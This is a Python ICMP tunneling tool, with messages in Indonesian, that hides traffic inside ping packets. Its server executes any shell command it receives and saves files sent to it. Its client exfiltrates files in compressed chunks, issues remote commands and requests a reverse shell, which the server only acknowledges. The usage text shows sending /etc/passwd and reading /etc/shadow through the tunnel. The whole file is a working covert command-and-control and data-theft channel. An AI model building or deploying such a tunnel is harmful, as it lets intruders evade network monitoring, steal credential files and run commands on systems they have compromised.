#!/usr/bin/env python3
"""
ICMP Tunnel - Tunneling data melalui paket ICMP echo request/reply.

Usage (Server - Linux, butuh root):
  sudo python icmp_tunnel.py --mode server --id 12345

Usage (Client - transfer file):
  python icmp_tunnel.py --mode client --server 192.168.1.10 --send /etc/passwd --id 12345

Usage (Client - command execution):
  python icmp_tunnel.py --mode client --server 192.168.1.10 --exec "cat /etc/shadow" --id 12345

Usage (Client - reverse shell):
  python icmp_tunnel.py --mode client --server 192.168.1.10 --reverse --rhost 10.0.0.1 --rport 4444 --id 12345
"""

import argparse
import os
import select
import socket
import struct
import subprocess
import sys
import threading
import time
import zlib

MAGIC = b"ICMPTL"
MAGIC_LEN = len(MAGIC)
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
MAX_PAYLOAD = 1400
HEADER_OVERHEAD = MAGIC_LEN + 4

BANNER = r"""
  ___  ___  __  __  ___   _____  _   _  _  _   _  _  _       ___ 
 |_ _|/ __||  \/  || _ \ |_   _|| | | || \| | | || || |     |_ _|
  | || (__ | |\/| ||  _/   | |  | |_| || .` | | \/ |/ _ \    | | 
 |___|\___||_|  |_||_|     |_|   \___/ |_|\_|  \__/ \___/   |___|
"""


def print_info(msg):
    print(f"[*] {msg}")


def print_success(msg):
    print(f"[+] {msg}")


def print_error(msg):
    print(f"[!] {msg}")


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def pack_icmp_packet(packet_id, seq, payload, icmp_type=ICMP_ECHO_REQUEST):
    header = struct.pack("!BBHHH", icmp_type, 0, 0, packet_id, seq)
    csum = checksum(header + payload)
    header = struct.pack("!BBHHH", icmp_type, 0, csum, packet_id, seq)
    return header + payload


def unpack_icmp_packet(data):
    if len(data) < 8:
        return None, None, None, None
    icmp_type, code, csum, pkt_id, seq = struct.unpack("!BBHHH", data[:8])
    payload = data[8:]
    return icmp_type, pkt_id, seq, payload


def encode_packet(seq, data_type, data):
    header = MAGIC + struct.pack("!HB", seq, data_type) + data
    return header


def decode_packet(payload):
    if len(payload) < HEADER_OVERHEAD:
        return None, None, None
    if payload[:MAGIC_LEN] != MAGIC:
        return None, None, None
    seq = struct.unpack("!H", payload[MAGIC_LEN:MAGIC_LEN + 2])[0]
    data_type = payload[MAGIC_LEN + 2]
    data = payload[HEADER_OVERHEAD:]
    return seq, data_type, data


DT_DATA = 0x01
DT_EOF = 0x02
DT_CMD = 0x10
DT_CMD_OUT = 0x11
DT_REV_SHELL = 0x20
DT_FILE_START = 0x30
DT_FILE_DATA = 0x31
DT_FILE_END = 0x32
DT_ACK = 0x40
DT_PING = 0x50


class ICMPServer:
    def __init__(self, tunnel_id=0x4141):
        self.tunnel_id = tunnel_id
        self.sock = None
        self.buffer = {}
        self.running = True

    def _create_socket(self):
        if os.name == "nt":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except Exception as e:
                print_error(f"Gagal membuat raw socket (admin?): {e}")
                return None
        else:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except PermissionError:
                print_error("Butuh root untuk raw socket.")
                return None
        return sock

    def run(self):
        self.sock = self._create_socket()
        if not self.sock:
            return

        print_success(f"ICMP Tunnel Server berjalan (ID: {hex(self.tunnel_id)})")
        print_info("Menunggu paket ICMP... (Ctrl+C untuk berhenti)")

        try:
            while self.running:
                ready, _, _ = select.select([self.sock], [], [], 1.0)
                if self.sock in ready:
                    data, addr = self.sock.recvfrom(65535)
                    ip_header_len = (data[0] & 0x0F) * 4
                    icmp_data = data[ip_header_len:]
                    icmp_type, pkt_id, seq, payload = unpack_icmp_packet(icmp_data)
                    if icmp_type != ICMP_ECHO_REQUEST or pkt_id != self.tunnel_id:
                        continue
                    threading.Thread(target=self.handle_packet, args=(payload, addr, seq),
                                     daemon=True).start()
        except KeyboardInterrupt:
            print_info("Server dihentikan.")
        finally:
            if self.sock:
                self.sock.close()

    def handle_packet(self, payload, addr, icmp_seq):
        seq, data_type, data = decode_packet(payload)
        if seq is None:
            return
        addr_key = f"{addr[0]}:{addr[1]}"

        if data_type == DT_CMD:
            cmd = data.decode(errors="ignore").rstrip("\x00")
            print_info(f"[CMD] {addr[0]} $ {cmd}")
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = b"[!] Timeout eksekusi command."
            except Exception as e:
                output = f"[!] Error: {e}".encode()
            self._send_reply(addr, seq, DT_CMD_OUT, output)
        elif data_type == DT_PING:
            self._send_reply(addr, seq, DT_PING, b"PONG")
        elif data_type in (DT_FILE_START, DT_FILE_DATA, DT_FILE_END):
            self._handle_file(addr_key, seq, data_type, data, addr)
        elif data_type == DT_REV_SHELL:
            print_info(f"[REVERSE] {addr[0]} reverse shell requested")
            self._send_reply(addr, seq, DT_ACK, b"REVERSE_ACK")

    def _send_reply(self, addr, seq, data_type, data):
        if not self.sock:
            return
        payload = encode_packet(seq, data_type, data)
        if len(payload) > MAX_PAYLOAD:
            for i in range(0, len(payload), MAX_PAYLOAD):
                chunk = payload[i:i + MAX_PAYLOAD]
                pkt = pack_icmp_packet(self.tunnel_id, i, chunk, ICMP_ECHO_REPLY)
                try:
                    self.sock.sendto(pkt, addr)
                except Exception:
                    break
                time.sleep(0.01)
        else:
            pkt = pack_icmp_packet(self.tunnel_id, seq, payload, ICMP_ECHO_REPLY)
            try:
                self.sock.sendto(pkt, addr)
            except Exception as e:
                print_error(f"Gagal kirim reply: {e}")

    def _handle_file(self, addr_key, seq, data_type, data, addr):
        if data_type == DT_FILE_START:
            self.buffer[addr_key] = {"data": b"", "name": data.decode(errors="ignore")}
            self._send_reply(addr, seq, DT_ACK, b"READY")
        elif data_type == DT_FILE_DATA and addr_key in self.buffer:
            self.buffer[addr_key]["data"] += data
            self._send_reply(addr, seq, DT_ACK, b"OK")
        elif data_type == DT_FILE_END and addr_key in self.buffer:
            buf = self.buffer.pop(addr_key)
            filename = os.path.basename(buf["name"]) or "received_file"
            save_path = os.path.join(os.getcwd(), f"icmp_tunnel_{filename}")
            with open(save_path, "wb") as f:
                f.write(buf["data"])
            print_success(f"File diterima: {save_path} ({len(buf['data'])} bytes)")
            self._send_reply(addr, seq, DT_ACK, b"DONE")


class ICMPClient:
    def __init__(self, server_ip, tunnel_id=0x4141):
        self.server = server_ip
        self.tunnel_id = tunnel_id
        self.sock = None

    def _create_socket(self):
        if os.name == "nt":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except Exception as e:
                print_error(f"Gagal membuat raw socket (admin?): {e}")
                return None
        else:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except PermissionError:
                print_error("Butuh root untuk raw socket.")
                return None
        sock.settimeout(5)
        return sock

    def _connect(self):
        if self.sock:
            return
        self.sock = self._create_socket()
        if not self.sock:
            sys.exit(1)

    def _send_ping(self, data_type, data=b""):
        self._connect()
        seq = int(time.time() * 1000) & 0xFFFF
        payload = encode_packet(seq, data_type, data)
        if len(payload) > MAX_PAYLOAD:
            for i in range(0, len(payload), MAX_PAYLOAD):
                chunk = payload[i:i + MAX_PAYLOAD]
                pkt = pack_icmp_packet(self.tunnel_id, i, chunk)
                self.sock.sendto(pkt, (self.server, 0))
                time.sleep(0.05)
        else:
            pkt = pack_icmp_packet(self.tunnel_id, seq, payload)
            self.sock.sendto(pkt, (self.server, 0))

    def _recv_reply(self, timeout=10):
        if not self.sock:
            return None, None
        self.sock.settimeout(timeout)
        try:
            while True:
                data, addr = self.sock.recvfrom(65535)
                ip_header_len = (data[0] & 0x0F) * 4
                icmp_data = data[ip_header_len:]
                icmp_type, pkt_id, seq, payload = unpack_icmp_packet(icmp_data)
                if icmp_type == ICMP_ECHO_REPLY and pkt_id == self.tunnel_id:
                    s, dt, d = decode_packet(payload)
                    return dt, d
        except socket.timeout:
            return None, None
        except Exception:
            return None, None

    def send_file(self, filepath):
        if not os.path.isfile(filepath):
            print_error(f"File tidak ditemukan: {filepath}")
            return
        print_info(f"Mengirim file: {filepath}")
        with open(filepath, "rb") as f:
            raw_data = f.read()
        data = zlib.compress(raw_data)
        print_info(f"Ukuran: {len(raw_data)} -> {len(data)} bytes (terkompresi)")

        self._send_ping(DT_FILE_START, os.path.basename(filepath).encode())
        dt, d = self._recv_reply()
        if dt != DT_ACK or d != b"READY":
            print_error("Server tidak siap.")
            return

        for i in range(0, len(data), 500):
            chunk = data[i:i + 500]
            self._send_ping(DT_FILE_DATA, chunk)
            time.sleep(0.1)

        self._send_ping(DT_FILE_END, b"")
        dt, d = self._recv_reply()
        if dt == DT_ACK and d == b"DONE":
            print_success("File terkirim.")

    def execute_command(self, cmd):
        print_info(f"Eksekusi: {cmd}")
        self._send_ping(DT_CMD, cmd.encode())
        collected = b""
        start = time.time()
        while time.time() - start < 15:
            dt, d = self._recv_reply(timeout=3)
            if dt == DT_CMD_OUT:
                collected += d
            if dt is not None:
                break
            time.sleep(0.5)
        if collected:
            print(collected.decode(errors="replace"))
        else:
            print_error("Tidak ada respon dari server.")

    def reverse_shell(self, rhost, rport):
        print_info(f"Meminta reverse shell ke {rhost}:{rport}")
        payload = f"{rhost}:{rport}".encode()
        self._send_ping(DT_REV_SHELL, payload)
        dt, d = self._recv_reply()
        if dt == DT_ACK:
            print_success("Server menerima permintaan reverse shell.")
        else:
            print_error("Server tidak merespon.")


def main():
    parser = argparse.ArgumentParser(
        description="ICMP Tunnel - Tunneling data melalui paket ICMP",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--mode", choices=["server", "client"], required=True,
                        help="Mode operasi (server/client)")
    parser.add_argument("--server", help="IP server ICMP tunnel (mode client)")
    parser.add_argument("--id", type=lambda x: int(x, 0), default=0x4141,
                        help="ICMP identifier untuk filtering (default: 0x4141)")
    parser.add_argument("--send", help="Kirim file ke server")
    parser.add_argument("--recv", help="Terima file dari server (via eksekusi command)")
    parser.add_argument("--exec", help="Eksekusi command di server")
    parser.add_argument("--reverse", action="store_true", help="Request reverse shell dari server")
    parser.add_argument("--rhost", help="Host untuk reverse shell callback")
    parser.add_argument("--rport", type=int, default=4444, help="Port reverse shell (default: 4444)")

    args = parser.parse_args()

    print(BANNER)
    print_info(f"Mode: {args.mode.upper()} | ID: {hex(args.id)}")

    if args.mode == "server":
        server = ICMPServer(tunnel_id=args.id)
        server.run()
    elif args.mode == "client":
        if not args.server:
            print_error("Mode client butuh --server")
            sys.exit(1)
        client = ICMPClient(args.server, tunnel_id=args.id)
        if args.send:
            client.send_file(args.send)
        elif args.exec:
            client.execute_command(args.exec)
        elif args.reverse:
            if not args.rhost:
                print_error("Reverse shell butuh --rhost")
                sys.exit(1)
            client.reverse_shell(args.rhost, args.rport)
        elif args.recv:
            client.execute_command(f"cat {args.recv}")
        else:
            print_error("Pilih operasi: --send, --recv, --exec, atau --reverse")
    else:
        print_error("Mode tidak dikenal.")


if __name__ == "__main__":
    main()
